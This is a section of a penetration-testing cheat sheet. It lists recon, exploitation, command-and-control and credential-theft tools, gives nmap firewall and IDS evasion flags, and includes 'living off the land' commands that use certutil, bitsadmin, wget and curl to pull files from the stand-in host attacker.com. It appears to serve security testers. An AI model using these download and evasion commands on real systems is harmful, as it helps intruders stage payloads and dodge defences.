## 🛠️ Advanced Toolset & Techniques

### Essential Tools (Expanded)

#### Reconnaissance Tools
- **Nmap**: Network discovery and security auditing
- **Masscan**: High-speed port scanner
- **Amass**: Attack surface mapping
- **Subfinder**: Subdomain discovery
- **Httpx**: HTTP toolkit
- **Nuclei**: Vulnerability scanner

#### Web Application Testing
- **Burp Suite**: Web vulnerability scanner
- **OWASP ZAP**: Web application security scanner
- **Gobuster**: Directory/file brute-forcer
- **FFuF**: Fast web fuzzer
- **SQLMap**: SQL injection exploitation
- **Nikto**: Web server scanner

#### Exploitation Frameworks
- **Metasploit**: Penetration testing framework
- **Cobalt Strike**: Advanced threat emulation
- **Empire**: PowerShell post-exploitation agent
- **Covenant**: .NET command and control framework

#### Post-Exploitation Tools
- **LinPEAS/WinPEAS**: Privilege escalation scripts
- **BloodHound**: Active Directory attack path analysis
- **Mimikatz**: Windows credential extraction
- **PowerView**: PowerShell AD enumeration
- **Impacket**: Python network protocols toolkit

### Advanced Techniques

#### Evasion Techniques
- [ ] **Firewall Evasion**:
  ```bash
  nmap -f <target>  # Fragment packets
  nmap -D RND:10 <target>  # Decoy scan
  nmap --source-port 53 <target>  # Source port manipulation
  ```
- [ ] **IDS/IPS Evasion**:
  ```bash
  nmap -T1 <target>  # Slow scan
  nmap --scan-delay 1s <target>  # Introduce delays
  ```

#### Living Off The Land
- [ ] **Windows LOLBAS**:
  ```cmd
  certutil -urlcache -split -f http://attacker.com/file.exe file.exe
  bitsadmin /transfer job http://attacker.com/file.exe C:\temp\file.exe
  ```
- [ ] **Linux LOLBINS**:
  ```bash
  wget http://attacker.com/file -O /tmp/file
  curl http://attacker.com/file -o /tmp/file
  ```

#### Steganography & Obfuscation
- [ ] **Steganography Tools**:
  - Steghide
  - Stegsolve
  - Binwalk
- [ ] **Code Obfuscation**:
  - PowerShell obfuscation
  - Python obfuscation
  - JavaScript obfuscation

---
